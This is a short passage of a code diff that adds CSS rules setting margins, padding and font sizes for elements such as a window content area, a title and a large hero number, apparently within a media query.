+        margin: 0 auto !important;
+    }
+
+    .google-window-content {
+        padding: 12px 14px 10px 14px !important;
+    }
+
+    .google-title {
+        font-size: 20px !important;
+    }
+
+    .google-dark-hero-number {
+        font-size: 46px !important;
+    }
 }
